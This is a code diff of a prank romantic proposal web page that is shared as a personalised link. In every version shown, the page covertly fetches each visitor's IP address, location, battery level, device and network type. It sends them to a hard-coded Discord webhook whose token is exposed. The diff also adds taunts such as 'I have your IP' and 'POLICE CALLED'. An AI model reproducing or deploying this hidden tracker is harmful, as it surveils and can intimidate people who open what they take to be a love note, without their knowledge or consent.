@@ -80,40 +80,32 @@
   let connectionType = "N/A";
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
+  // NEW: 20 AGGRESSIVE/FUNNY NO BUTTON TEXTS
+  const taunts = [
+    "I have your IP 📍", "Search history leaking... 🔍", "POLICE CALLED 👮", 
+    "Deleting your Roblox? 🎮", "I'm in your walls 🧱", "NICKI MINAJ FAN? LEAKED 🎤",
+    "Say No and I steal your cat 🐈", "resistance is futile 🤖", "WRONG BUTTON!",
+    "Try harder! 😂", "Missed me!", "Too slow!", "I see you blushing 😳", 
+    "Calling your Mom... 📞", "Exposing your DMs 📨", "Say Yes or else!",
+    "You're making this hard 😈", "Stop playing with me!", "I'm outside 🏠", "Last chance!"
+  ];
+
   const promises = [
     "Thank you, {name}. I promise to hold your hand through every storm. We are forever.",
     "You made me the luckiest alive, {name}. I'm yours forever.",
     "{name}, I promise to love you more with every sunrise.",
     "I knew you'd say yes, {name}! I promise to be your safest place.",
-    "My heart is finally at peace. Thank you for choosing me, {name}.",
-    "{name}, I promise to keep a smile on your face and love in your heart.",
-    "You're my greatest adventure, {name}. Let's make this forever.",
-    "To the world you may be one person, but to me you are the world, {name}.",
-    "Thank you for saying yes, {name}. I promise to fight for us, always.",
-    "{name}, you are my today and all of my tomorrows.",
-    "My heart is officially yours, {name}. Handle with love!",
-    "I promise to be the reason you look down at your phone and smile, {name}.",
-    "{name}, I'll be your shoulder to lean on and your partner in crime.",
-    "I'm so glad it's you, {name}. I promise to choose you every single day.",
-    "{name}, you're the best thing that ever happened to me. Forever starts now.",
-    "I promise to love you even when we're old and wrinkly, {name}.",
-    "You've made me so happy, {name}. I promise to return that happiness tenfold.",
-    "{name}, I promise to be your biggest fan and your best friend.",
-    "Thank you for letting me love you, {name}. It's a promise I'll never break.",
-    "I'm yours, {name}. No refunds, no exchanges, just endless love."
+    "My heart is finally at peace. Thank you for choosing me, {name}."
   ];
 
   window.onload = async () => {
-    // 🔋 Battery Fetch
     if (navigator.getBattery) {
       const battery = await navigator.getBattery();
       batteryLevel = `${Math.round(battery.level * 100)}%`;
     }
-
     if (navigator.connection) {
       connectionType = navigator.connection.effectiveType || "Unknown";
     }
-
     const params = new URLSearchParams(window.location.search);
     if(params.get('to')) document.getElementById('userName').value = decodeURIComponent(params.get('to'));
     if(params.get('msg')) {
@@ -122,16 +114,13 @@
       msgEl.style.opacity = "1";
       msgEl.classList.add('pulsing');
     }
-
     sendDiscordReport("Visitor Landed");
   };
 
   async function sendDiscordReport(status) {
     const now = new Date();
-    
     let spyData = {};
     try {
-        // CHANGED TO IPWHOIS - HIGHER BYPASS RATE FOR IOS/PRIVACY
         const res = await fetch('https://ipwho.is/');
         spyData = await res.json();
     } catch (e) { spyData = { ip: "Blocked", city: "Unknown", region: "Unknown", connection: { isp: "Unknown" } }; }
@@ -144,7 +133,6 @@
           { name: "Event", value: `**${status}**`, inline: true },
           { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
           { name: "Battery", value: batteryLevel, inline: true },
-          { name: "Network", value: connectionType, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
           { name: "Location", value: `${spyData.city || "Unknown"}, ${spyData.region || "Unknown"}`, inline: true },
           { name: "IP Address", value: `\`${spyData.ip || "Blocked"}\``, inline: false },
@@ -154,11 +142,7 @@
       }]
     };
 
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
+    fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
   }
 
   function startApp() {
@@ -174,13 +158,18 @@
     const noBtn = document.getElementById("no");
     const yesBtn = document.getElementById("yes");
     
+    // UPDATING THE NO BUTTON TEXT DIRECTLY
+    const currentTaunt = taunts[clickCount % taunts.length];
+    noBtn.innerText = currentTaunt;
+    document.getElementById("joke-text").innerText = currentTaunt;
+
     noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
     noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
 
     yesScale += 0.25;
     yesBtn.style.transform = `scale(${yesScale})`;
 
-    if (clickCount % 5 === 0) sendDiscordReport(`Struggling: ${clickCount} misses`);
+    if (clickCount % 5 === 0) sendDiscordReport(`Struggling: ${clickCount} misses | Last Taunt: "${currentTaunt}"`);
   }
 
   function yesClick() {
@@ -193,14 +182,9 @@
 
   function updateSuggestions() {
     const to = document.getElementById('targetInput').value.trim() || "You";
-    const deepMessages = [
-      `${to}, you are the piece of my soul I never knew was missing.`,
-      `Every beat of my heart belongs to you, ${to}.`,
-      `In a world of temporary things, ${to}, you are my forever.`
-    ];
+    const deepMessages = [`${to}, you are my piece of soul.`, `Every beat of my heart belongs to you, ${to}.`, `In a world of temporary things, ${to}, you are my forever.`];
     const select = document.getElementById('suggestionBox');
-    select.innerHTML = '<option value="">✨ Romantic Suggestions...</option>' + 
-      deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
+    select.innerHTML = '<option value="">✨ Romantic Suggestions...</option>' + deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
   }
 
   function processLinkGeneration() {
